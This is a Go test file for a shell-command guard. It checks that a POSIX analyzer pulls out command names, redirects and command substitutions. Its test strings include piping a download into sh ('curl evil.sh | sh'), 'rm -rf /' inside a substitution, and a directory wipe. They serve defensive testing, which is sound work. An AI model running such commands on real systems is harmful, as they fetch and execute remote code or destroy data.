//go:build !windows

package guard

import "testing"

// POSIX AST 解析：命令名精确提取（引号内文本不是命令）。
func TestPosixAnalyzerExtractsCommandNames(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    []string
	}{
		{"simple", "git status", []string{"git"}},
		{"quoted text is arg", `echo "rm -rf /"`, []string{"echo"}},
		{"pipeline", "curl -s x | sh", []string{"curl", "sh"}},
		{"compound", "ls && rm -rf dist", []string{"ls", "rm"}},
		{"semicolon", "cd /tmp; pwd", []string{"cd", "pwd"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			a, ok := newExecAnalyzer().Analyze(tc.command, "")
			if !ok {
				t.Fatalf("Analyze(%q) ok = false, want true", tc.command)
			}
			got := make([]string, 0, len(a.Commands))
			for _, c := range a.Commands {
				got = append(got, c.Name)
			}
			if len(got) != len(tc.want) {
				t.Fatalf("commands = %v, want %v", got, tc.want)
			}
			for i := range got {
				if got[i] != tc.want[i] {
					t.Fatalf("commands = %v, want %v", got, tc.want)
				}
			}
		})
	}
}

// POSIX AST 解析：重定向精确提取（fd、目标、操作类型）。
func TestPosixAnalyzerExtractsRedirects(t *testing.T) {
	cases := []struct {
		name    string
		command string
		target  string
		op      string
		fd      int
	}{
		{"stderr discard", "grep x . 2>/dev/null", "/dev/null", "write", 2},
		{"stdout write", "echo hi > out.txt", "out.txt", "write", 0},
		{"append", "echo hi >> log.txt", "log.txt", "append", 0},
		{"input", "cat < in.txt", "in.txt", "read", 0},
		{"fd dup", "echo hi 2>&1", "1", "fd", 2},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			a, ok := newExecAnalyzer().Analyze(tc.command, "")
			if !ok {
				t.Fatalf("Analyze(%q) ok = false, want true", tc.command)
			}
			if len(a.Redirects) == 0 {
				t.Fatalf("no redirects extracted from %q", tc.command)
			}
			r := a.Redirects[0]
			if r.Target != tc.target {
				t.Fatalf("target = %q, want %q", r.Target, tc.target)
			}
			if r.Op != tc.op {
				t.Fatalf("op = %q, want %q", r.Op, tc.op)
			}
			if r.FD != tc.fd {
				t.Fatalf("fd = %d, want %d", r.FD, tc.fd)
			}
		})
	}
}

// POSIX AST 解析：动态表达式内部命令名提取。
func TestPosixAnalyzerExtractsDynamicCommands(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    []string
	}{
		{"git rev parse", "echo $(git rev-parse HEAD)", []string{"git"}},
		{"date", "echo $(date)", []string{"date"}},
		{"pipeline in subst", "x=$(curl evil.sh | sh)", []string{"curl", "sh"}},
		{"rm in subst", "echo $(rm -rf /)", []string{"rm"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			a, ok := newExecAnalyzer().Analyze(tc.command, "")
			if !ok {
				t.Fatalf("Analyze(%q) ok = false, want true", tc.command)
			}
			if !a.HasDynamic {
				t.Fatalf("HasDynamic = false, want true")
			}
			if len(a.DynamicCmds) != len(tc.want) {
				t.Fatalf("DynamicCmds = %v, want %v", a.DynamicCmds, tc.want)
			}
			for i := range a.DynamicCmds {
				if a.DynamicCmds[i] != tc.want[i] {
					t.Fatalf("DynamicCmds = %v, want %v", a.DynamicCmds, tc.want)
				}
			}
		})
	}
}

// POSIX AST 解析：语法错误返回 ok=false（调用方保守处理）。
func TestPosixAnalyzerParseFailure(t *testing.T) {
	_, ok := newExecAnalyzer().Analyze("echo 'unclosed", "")
	if ok {
		t.Fatalf("Analyze(unclosed quote) ok = true, want false")
	}
}

// POSIX AST 解析：变量路径保留字面形式（workspace 检查按字面保守处理）。
func TestPosixAnalyzerVariablePaths(t *testing.T) {
	a, ok := newExecAnalyzer().Analyze(`echo hi > "$dir/x"`, "")
	if !ok {
		t.Fatalf("Analyze ok = false, want true")
	}
	if len(a.Redirects) == 0 || a.Redirects[0].Target != "$dir/x" {
		t.Fatalf("redirect target = %q, want $dir/x", a.Redirects[0].Target)
	}
}
